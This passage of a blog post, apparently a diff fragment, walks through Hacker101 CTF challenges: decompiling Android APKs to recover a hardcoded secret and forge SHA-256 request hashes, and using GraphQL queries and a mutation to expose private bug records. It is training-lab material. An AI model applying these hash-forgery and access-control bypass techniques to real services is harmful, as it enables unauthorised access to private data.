+<td>{“temperature”: 77, “success”: true}</td>
+</tr>
+<tr>
+<td>eyJjbWQiOiJzZXRUZW1wIiwidGVtcCI6Nzd9</td>
+<td>{“cmd”:”setTemp”,”temp”:77}</td>
+</tr>
+<tr>
+<td>eyJjbWQiOiJzZXRUZW1wIiwidGVtcCI6NzB9</td>
+<td>{“cmd”:”setTemp”,”temp”:70}</td>
+</tr>
+<tr>
+<td>eyJzdWNjZXNzIjogdHJ1ZX0=</td>
+<td>{“success”: true}</td>
+</tr>
+</tbody></table>
+<p>As the app shows current temperature is 73 and target 70.</p>
+<p><img src="./hacker101-ctf/h1_thermostat/flag1/imgs/app.jpg" alt></p>
+<p>Tried to manually change the temperature by encode </p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//eyJjbWQiOiJzZXRUZW1wIiwidGVtcCI6NzN9</span></span><br><span class="line">base64(&#123;<span class="string">"cmd"</span>:<span class="string">"setTemp"</span>,<span class="string">"temp"</span>:<span class="number">73</span>&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>But got an error as following</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//eyJzdWNjZXNzIjogZmFsc2UsICJlcnJvciI6ICJNQUMgZmFpbHVyZSJ9</span><br><span class="line">&#123;<span class="attr">"success"</span>: <span class="literal">false</span>, <span class="attr">"error"</span>: <span class="string">"MAC failure"</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x01-Check-Source"><a href="#0x01-Check-Source" class="headerlink" title="0x01 Check Source"></a>0x01 Check Source</h3><p>Something wrong with that MAC. Need go back to check the source for some help.</p>
+<p><img src="./hacker101-ctf/h1_thermostat/flag1/imgs/src.jpg" alt></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">classes.dex -&gt; com -&gt; hacker101 -&gt; level11 -&gt; PlayloadRequest</span><br></pre></td></tr></table></figure>
+
+<p>Both flags can be found here.</p>
+<p><img src="./hacker101-ctf/h1_thermostat/flag1/imgs/flag.jpg" alt></p>
+<h2 id="Intentional-Exercise"><a href="#Intentional-Exercise" class="headerlink" title="Intentional Exercise"></a>Intentional Exercise</h2><h3 id="Flag0-–-Found-12"><a href="#Flag0-–-Found-12" class="headerlink" title="Flag0 – Found"></a><a href="./flag0">Flag0</a> – Found</h3><ul>
+<li>Check the manifest</li>
+<li>Is the link really broken?</li>
+<li>Launching from another app might help</li>
+</ul>
+<h2 id="Intentional-Exercise-FLAG0"><a href="#Intentional-Exercise-FLAG0" class="headerlink" title="Intentional Exercise - FLAG0"></a>Intentional Exercise - FLAG0</h2><h3 id="0x00-App-Home"><a href="#0x00-App-Home" class="headerlink" title="0x00 App Home"></a>0x00 App Home</h3><p>On app load, a request is sening to server and got an flag link.</p>
+<p><img src="./hacker101-ctf/intentional_exercise/flag0/imgs/home.jpg" alt></p>
+<p>However, the result shows invalid request</p>
+<p><img src="./hacker101-ctf/intentional_exercise/flag0/imgs/invalid.jpg" alt></p>
+<h3 id="0x01-Mutate-Request"><a href="#0x01-Mutate-Request" class="headerlink" title="0x01 Mutate Request"></a>0x01 Mutate Request</h3><p>It is a practice to modify all the HTTP parameters you can reach.</p>
+<p>It seems always send the same link no matter what parameter I send in request.</p>
+<p><img src="./hacker101-ctf/intentional_exercise/flag0/imgs/request.jpg" alt></p>
+<p>But the second request needs more data.</p>
+<p><img src="./hacker101-ctf/intentional_exercise/flag0/imgs/flagbearer.jpg" alt></p>
+<p>After adding the parameter <strong>hash</strong>, it shows a diffeerent response.</p>
+<p><img src="./hacker101-ctf/intentional_exercise/flag0/imgs/invalid_hash.jpg" alt></p>
+<h3 id="0x02-Check-Source"><a href="#0x02-Check-Source" class="headerlink" title="0x02 Check Source"></a>0x02 Check Source</h3><p>As we have the <strong>apk</strong> file, we may check inside of it.</p>
+<h4 id="Dex-to-Jar"><a href="#Dex-to-Jar" class="headerlink" title="Dex to Jar"></a>Dex to Jar</h4><p>Use <a href="http://127.0.0.1/xxxxxxxxxx/?post=6ybKGEfF47eN1k5eyj!lsraaVXFME-xBz51ocCeiAZPULUMIemubmPanqBO04ixb-01L-Qek7nUeXitmNAEMNrJ5BbfeP5GWD1hYEuHciAk81fRa4IyuvmcIG3sE1K11mM7s7hA1P1mChArqJR4i5wSrOF7O561nOHu!lGQcA1iFos-jU6x7iy-TJ4iI4yZjnHkcdXT2F9y6fH4!TY!DcA~~" target="_blank" rel="noopener">dex2jar</a> to convert to <strong>jar</strong>.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d2j-dex2jar.bat -f ./level13.apk</span><br></pre></td></tr></table></figure>
+
+<p>So we got <strong>level13-dex2jar.jar</strong> now.</p>
+<h4 id="Decompile"><a href="#Decompile" class="headerlink" title="Decompile"></a>Decompile</h4><p>Use <a href="http://127.0.0.1/xxxxxxxxxx/?post=6ybKGEfF47eN1k5eyj!lsraaVXFME-xBz51ocCeiAZPULUMIemubmPanqBO04ixb-01L-Qek7nUeXitmNAEMNrJ5BbfeP5GWD1hYEuHciAk81fRa4IyuvmcIG3sE1K11mM7s7hA1P1mChArqJR4i5wSrOF7O561nOHu!lGQcA1iFos-jU6x7iy-TJ4iI4yZjnHkcdXT2F9y6fH4!TY!DcA~~" target="_blank" rel="noopener">jd-gui</a> to chek inside of the <strong>jar</strong>.</p>
+<p><img src="./hacker101-ctf/intentional_exercise/flag0/imgs/source.jpg" alt></p>
+<h3 id="0x03-Code-Review"><a href="#0x03-Code-Review" class="headerlink" title="0x03 Code Review"></a>0x03 Code Review</h3><p>The full source can be found at <a href="./MainActivity.java">MainActivity.java</a></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">MessageDigest messageDigest = MessageDigest.getInstance(<span class="string">"SHA-256"</span>);</span><br><span class="line">messageDigest.update(<span class="string">"s00p3rs3cr3tk3y"</span>.getBytes(StandardCharsets.UTF_8));</span><br><span class="line">messageDigest.update(str3.getBytes(StandardCharsets.UTF_8));</span><br><span class="line"><span class="keyword">byte</span>[] arrayOfByte = messageDigest.digest();</span><br></pre></td></tr></table></figure>
+
+<p>The request hash is generated with the secret key <strong>s00p3rs3cr3tk3y</strong> and the message payload <strong>str3</strong> with <strong>SHA-256</strong></p>
+<p>However, the first request <a href="https://www.cmd5.com/hash.aspx?s=s00p3rs3cr3tk3y" target="_blank" rel="noopener">hash</a> is just the secret key without any payload. </p>
+<p><a href="http://127.0.0.1/xxxxxxxxxx/appRoot?&amp;hash=61f4518d844a9bd27bb971e55a23cd6cf3a9f5ef7f46285461cf6cf135918a1a" target="_blank" rel="noopener">http://127.0.0.1/xxxxxxxxxx/appRoot?&amp;hash=61f4518d844a9bd27bb971e55a23cd6cf3a9f5ef7f46285461cf6cf135918a1a</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHA-256(s00p3rs3cr3tk3y) = 61f4518d844a9bd27bb971e55a23cd6cf3a9f5ef7f46285461cf6cf135918a1a</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x04-Get-Hash"><a href="#0x04-Get-Hash" class="headerlink" title="0x04 Get Hash"></a>0x04 Get Hash</h3><p>There is another piece of code shows the hint.</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Uri uri = getIntent().getData();</span><br><span class="line">str3 = uri.toString().substring(<span class="number">28</span>);</span><br></pre></td></tr></table></figure>
+
+<p>and</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">data</span> </span></span><br><span class="line"><span class="tag">	<span class="attr">android:scheme</span>=<span class="string">"http"</span></span></span><br><span class="line"><span class="tag">	<span class="attr">android:host</span>=<span class="string">"level13.hacker101.com"</span> </span></span><br><span class="line"><span class="tag">/&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>So the payload string after the index of 28 should be</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"http://level13.hacker101.com"</span>.substring(<span class="number">28</span>);</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>uri</th>
+<th>payload</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>/appRoot</td>
+<td>null</td>
+</tr>
+<tr>
+<td>/appRoot/flagBeare</td>
+<td>/flagBearer</td>
+</tr>
+</tbody></table>
+<p>So we need to encrypt <strong>/flagBearer</strong> with secret key <strong>s00p3rs3cr3tk3y</strong> for this hash.</p>
+<p>Try use this online <a href="https://www.cmd5.com/hash.aspx?s=s00p3rs3cr3tk3y/flagBearer" target="_blank" rel="noopener">tool</a>.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHA-256(s00p3rs3cr3tk3y/flagBearer) = 8743a18df6861ced0b7d472b34278dc29abba81b3fa4cf836013426d6256bd5e</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x05-FLAG"><a href="#0x05-FLAG" class="headerlink" title="0x05 FLAG"></a>0x05 FLAG</h3><p>Create a new get request with the new generated hash. The server will send back FLAG.</p>
+<p><a href="http://127.0.0.1/xxxxxxxxxx/appRoot/flagBearer?&amp;hash=8743a18df6861ced0b7d472b34278dc29abba81b3fa4cf836013426d6256bd5e" target="_blank" rel="noopener">http://127.0.0.1/xxxxxxxxxx/appRoot/flagBearer?&amp;hash=8743a18df6861ced0b7d472b34278dc29abba81b3fa4cf836013426d6256bd5e</a></p>
+<p><img src="./hacker101-ctf/intentional_exercise/flag0/imgs/flag.jpg" alt></p>
+<h2 id="BugDB-v1"><a href="#BugDB-v1" class="headerlink" title="BugDB v1"></a>BugDB v1</h2><h3 id="Flag0-–-Found-13"><a href="#Flag0-–-Found-13" class="headerlink" title="Flag0 – Found"></a><a href="./flag0">Flag0</a> – Found</h3><ul>
+<li>What can you see? What can you not see?</li>
+<li>What data types are involved?</li>
+<li>Have you tried querying different endpoints?</li>
+</ul>
+<h2 id="BugDB-v1-FLAG0"><a href="#BugDB-v1-FLAG0" class="headerlink" title="BugDB v1 - FLAG0"></a>BugDB v1 - FLAG0</h2><h3 id="0x00-Overview-1"><a href="#0x00-Overview-1" class="headerlink" title="0x00 Overview"></a>0x00 Overview</h3><p>Very direct and easy CTF. The purpose is more like taking a tour of Graphql.</p>
+<h3 id="0x01-FLAG-3"><a href="#0x01-FLAG-3" class="headerlink" title="0x01 FLAG"></a>0x01 FLAG</h3><p>The left side is the QUERY and the RIGHT side is results.</p>
+<p>There is also a very clear structure of data at very right side for reference.</p>
+<p>So just make a query to loop through all the details of the data set.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">query&#123;</span><br><span class="line">  user &#123;</span><br><span class="line">    edges &#123;</span><br><span class="line">      node &#123;</span><br><span class="line">        id</span><br><span class="line">        username</span><br><span class="line">        bugs &#123;</span><br><span class="line">          pageInfo &#123;</span><br><span class="line">            startCursor</span><br><span class="line">            endCursor</span><br><span class="line">          &#125;</span><br><span class="line">          edges &#123;</span><br><span class="line">            cursor</span><br><span class="line">            node &#123;</span><br><span class="line">              id</span><br><span class="line">              reporterId</span><br><span class="line">              text</span><br><span class="line">              private</span><br><span class="line">              reporter &#123;</span><br><span class="line">                id</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>And here comes the flag.</p>
+<p><img src="./hacker101-ctf/bugdb_v1/flag0/imgs/flag.jpg" alt></p>
+<h2 id="BugDB-v2"><a href="#BugDB-v2" class="headerlink" title="BugDB v2"></a>BugDB v2</h2><h3 id="Flag0-–-Found-14"><a href="#Flag0-–-Found-14" class="headerlink" title="Flag0 – Found"></a><a href="./flag0">Flag0</a> – Found</h3><ul>
+<li>What has changed since last version?</li>
+<li>What do the queries tell you?</li>
+<li>Have you tried a mutation?</li>
+</ul>
+<h2 id="BugDB-v2-FLAG0"><a href="#BugDB-v2-FLAG0" class="headerlink" title="BugDB v2 - FLAG0"></a>BugDB v2 - FLAG0</h2><h3 id="0x00-Overview-2"><a href="#0x00-Overview-2" class="headerlink" title="0x00 Overview"></a>0x00 Overview</h3><p>Pretty much as <a href="http://127.0.0.1/xxxxxxxxxx/?post=6ybKGEfF47eN1k5eyj!lsraaVXFME-xBz51ocCeiAZPULUMIemubmPanqBO04ixb-01L-Qek7nUeXitmNAEMNrJ5BbfeP5GWD1hYEuHciAk81fRa4IyuvmcIG3sE1K11mM7s7hA1P1mChArqJR4i5wSrOF7O561nOHu!lGQcA1iFos-jU6x7iy-TJ4iI4yZjnHkcdXT2F9y6fH4!TY!DcA~~" target="_blank" rel="noopener">BugDB v1</a>. There is only a tiny difference on mutate the data.</p>
+<h3 id="0x01-Take-a-Tour"><a href="#0x01-Take-a-Tour" class="headerlink" title="0x01 Take a Tour"></a>0x01 Take a Tour</h3><h4 id="allUsers"><a href="#allUsers" class="headerlink" title="allUsers"></a>allUsers</h4><p>Users no longer have their bugs.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">query&#123;</span><br><span class="line">  allUsers &#123;</span><br><span class="line">    edges &#123;</span><br><span class="line">      node &#123;</span><br><span class="line">        id</span><br><span class="line">        username</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="./hacker101-ctf/bugdb_v2/flag0/imgs/allUsers.jpg" alt></p>
+<h4 id="allBugs"><a href="#allBugs" class="headerlink" title="allBugs"></a>allBugs</h4><p>There is only one bug in array. And the one shows NOT PRIVATE status.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">query&#123;</span><br><span class="line">  allBugs &#123;</span><br><span class="line">    id</span><br><span class="line">    reporter &#123;</span><br><span class="line">      id</span><br><span class="line">      username</span><br><span class="line">    &#125;</span><br><span class="line">    reporterId</span><br><span class="line">    text</span><br><span class="line">    private</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="./hacker101-ctf/bugdb_v2/flag0/imgs/allBugs.jpg" alt></p>
+<p>And the bug id can be <a href="http://127.0.0.1/xxxxxxxxxx/?post=123456ybKGEfF47eN1k5eyj!lsraaVXFME-xBz51ocCeiAZPULUMIemubmPanqBO04ixb-01L-Qek7nUeXitmNAEMNrJ5BbfeP5GWD1hYEuHciAk81fRa4IyuvmcIG3sE1K11mM7s7hA1P1mChArqJR4i5wSrOF7O561nOHu!lGQcA1iFos-jU6x7iy-TJ4iI4yZjnHkcdXT2F9y6fH4!TY!DcA~~" target="_blank" rel="noopener">decoded</a> </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base64decode(QnVnczox) = Bugs:1</span><br></pre></td></tr></table></figure>
+
+<h4 id="mutation"><a href="#mutation" class="headerlink" title="mutation"></a>mutation</h4><p>Try modify Bugs:2</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mutation&#123;</span><br><span class="line">  modifyBug(id:2, private:false) &#123;</span><br><span class="line">    ok</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="./hacker101-ctf/bugdb_v2/flag0/imgs/mutation.jpg" alt></p>
+<h3 id="0x02-FLAG-7"><a href="#0x02-FLAG-7" class="headerlink" title="0x02 FLAG"></a>0x02 FLAG</h3><p>Go check back allBugs again.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">query&#123;</span><br><span class="line">  allBugs &#123;</span><br><span class="line">    id</span><br><span class="line">    reporter &#123;</span><br><span class="line">      id</span><br><span class="line">      username</span><br><span class="line">    &#125;</span><br><span class="line">    reporterId</span><br><span class="line">    text</span><br><span class="line">    private</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Get the FLAG</p>
+<p><img src="./hacker101-ctf/bugdb_v2/flag0/imgs/flag.jpg" alt></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">[1]: ../../bugdb_v1/flag0</span><br><span class="line">[2]: https://www.base64decode.org/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[1]: https://www.urlencoder.org/</span><br><span class="line">[2]: ./main.py</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[1]: ./request.txt</span><br><span class="line">[2]: https://github.com/sqlmapproject/sqlmap</span><br><span class="line"></span><br><span class="line">[1]: https://github.com/testerting/hacker101-ctf/blob/master/photo_gallery/flag0/main.py#L39</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[1]: ../flag1</span><br><span class="line">[2]: ./main.py</span><br><span class="line">[3]: https://github.com/tiangolo/uwsgi-nginx-flask-docker</span><br><span class="line">[4]: ../</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[1]: https://ctf.hacker101.com/ctf</span><br><span class="line">[2]: ./a_little_something_to_get_you_started</span><br><span class="line">[3]: ./micro-cms_v1</span><br><span class="line">[4]: ./tempimage</span><br><span class="line">[5]: ./micro-cms_v2</span><br><span class="line">[6]: ./postbook</span><br><span class="line">[7]: ./petshop_pro</span><br><span class="line">[8]: ./codys_first_blog</span><br><span class="line">[9]: ./ticketastic_live_instance</span><br><span class="line">[10]: ./photo_gallery</span><br><span class="line">[11]: ./h1_thermostat</span><br><span class="line">[12]: ./encrypted_pastebin</span><br><span class="line">[13]: ./model_e1337-rolling_code_lock</span><br><span class="line">[14]: ./model_e1337_v2-hardened_rolling_code_lock</span><br><span class="line">[15]: ./intentional_exercise</span><br><span class="line">[16]: ./hello_world</span><br><span class="line">[17]: ./rend_asunder</span><br><span class="line">[18]: ./bugdb_v1</span><br><span class="line">[19]: ./bugdb_v2</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+        
+      
+
+      <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
+              
+                <a href="/2019/08/19/macdown/" rel="next" title="MacDown">
+                  <i class="fa fa-chevron-left"></i> MacDown
+                </a>
+              
+            </div>
+
+            <span class="post-nav-divider"></span>
+
+            <div class="post-nav-prev post-nav-item">
+              
+            </div>
+          </div>
+        
+      </footer>
+    
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+
+        </div>
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">fangshengjian</p>
+  <div class="site-description motion-element" itemprop="description">less is more</div>
+</div>
+  <nav class="site-state motion-element">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">4</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+    
+  </nav>
+
+
+
+        </div>
+      </div>
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Hacker101-CTF"><span class="nav-number">1.</span> <span class="nav-text">Hacker101 CTF</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-Overview"><span class="nav-number">1.1.</span> <span class="nav-text">0x00 Overview</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-CTF"><span class="nav-number">1.2.</span> <span class="nav-text">0x01 CTF</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#A-little-something-to-get-you-started"><span class="nav-number">1.3.</span> <span class="nav-text">A little something to get you started</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Flag0-–-Found"><span class="nav-number">1.3.1.</span> <span class="nav-text">Flag0 – Found</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#A-little-something-to-get-you-started-FLAG0"><span class="nav-number">1.4.</span> <span class="nav-text">A little something to get you started - FLAG0</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00-Index"><span class="nav-number">1.4.1.</span> <span class="nav-text">0x00 Index</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-Inspect-Element"><span class="nav-number">1.4.2.</span> <span class="nav-text">0x01 Inspect Element</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-Go-Investigate"><span class="nav-number">1.4.3.</span> <span class="nav-text">0x02 Go Investigate</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Micro-CMS-v1"><span class="nav-number">1.5.</span> <span class="nav-text">Micro-CMS v1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Flag0-–-Found-1"><span class="nav-number">1.5.1.</span> <span class="nav-text">Flag0 – Found</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Flag1-–-Found"><span class="nav-number">1.5.2.</span> <span class="nav-text">Flag1 – Found</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Flag2-–-Found"><span class="nav-number">1.5.3.</span> <span class="nav-text">Flag2 – Found</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Flag3-–-Found"><span class="nav-number">1.5.4.</span> <span class="nav-text">Flag3 – Found</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Micro-CMS-v1-FLAG0"><span class="nav-number">1.6.</span> <span class="nav-text">Micro-CMS v1 - FLAG0</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00-Index-1"><span class="nav-number">1.6.1.</span> <span class="nav-text">0x00 Index</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-Create-New-Page"><span class="nav-number">1.6.2.</span> <span class="nav-text">0x01 Create New Page</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-Check-Other-Pages"><span class="nav-number">1.6.3.</span> <span class="nav-text">0x02 Check Other Pages</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-Edit-Page"><span class="nav-number">1.6.4.</span> <span class="nav-text">0x03 Edit Page</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04-FLAG"><span class="nav-number">1.6.5.</span> <span class="nav-text">0x04 FLAG</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Micro-CMS-v1-FLAG1"><span class="nav-number">1.7.</span> <span class="nav-text">Micro-CMS v1 - FLAG1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00-Index-2"><span class="nav-number">1.7.1.</span> <span class="nav-text">0x00 Index</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-Page-1"><span class="nav-number">1.7.2.</span> <span class="nav-text">0x01 Page 1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-Edit-Page"><span class="nav-number">1.7.3.</span> <span class="nav-text">0x02 Edit Page</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-FLAG"><span class="nav-number">1.7.4.</span> <span class="nav-text">0x03 FLAG</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Micro-CMS-v1-FLAG2"><span class="nav-number">1.8.</span> <span class="nav-text">Micro-CMS v1 - FLAG2</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00-Index-3"><span class="nav-number">1.8.1.</span> <span class="nav-text">0x00 Index</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-Page-1-1"><span class="nav-number">1.8.2.</span> <span class="nav-text">0x01 Page 1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-Edit-Page-1"><span class="nav-number">1.8.3.</span> <span class="nav-text">0x02 Edit Page 1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-FLAG-1"><span class="nav-number">1.8.4.</span> <span class="nav-text">0x03 FLAG</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Micro-CMS-v1-FLAG3"><span class="nav-number">1.9.</span> <span class="nav-text">Micro-CMS v1 - FLAG3</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00-Index-4"><span class="nav-number">1.9.1.</span> <span class="nav-text">0x00 Index</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-Page-2"><span class="nav-number">1.9.2.</span> <span class="nav-text">0x01 Page 2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-Edit-Page-2"><span class="nav-number">1.9.3.</span> <span class="nav-text">0x02 Edit Page 2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-FLAG-2"><span class="nav-number">1.9.4.</span> <span class="nav-text">0x03 FLAG</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Micro-CMS-v2"><span class="nav-number">1.10.</span> <span class="nav-text">Micro-CMS v2</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Flag0-–-Found-2"><span class="nav-number">1.10.1.</span> <span class="nav-text">Flag0 – Found</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Flag1-–-Found-1"><span class="nav-number">1.10.2.</span> <span class="nav-text">Flag1 – Found</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Flag2-–-Found-1"><span class="nav-number">1.10.3.</span> <span class="nav-text">Flag2 – Found</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Micro-CMS-v2-FLAG0"><span class="nav-number">1.11.</span> <span class="nav-text">Micro-CMS v2 - FLAG0</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00-Index-5"><span 